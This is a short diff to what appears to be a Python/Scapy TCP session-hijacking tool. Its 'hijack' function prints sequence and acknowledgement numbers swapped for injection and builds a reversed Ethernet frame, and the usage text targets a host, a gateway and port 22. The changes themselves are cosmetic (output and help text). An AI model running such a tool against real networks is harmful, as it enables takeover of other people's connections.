@@ -9,7 +9,7 @@ def hijack(packet):
                 print("TCP Sequence: " + str(packet[TCP].seq) + " | Ack: " + str(packet[TCP].ack))
                 print("Hijack Sequence: " + str(packet[TCP].ack) + " | Hijack Ack: " + str(packet[TCP].seq) +"\n")
 
-                print("Data: " + str(packet[TCP].display))
+                print("Data: " + str(packet.show()))
 
                 ether = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
 
@@ -66,9 +66,7 @@ try:
                       ) 
    
 except:
-        print('[-]Please specify the appropriate options.')
-        print('[!]Example: -t 10.20.30.40 -g 10.20.30.1 -p 22')
-        print('[?] -h for help')
+        parser.print_help()
         sys.exit(1)
 
 sys.exit(0)
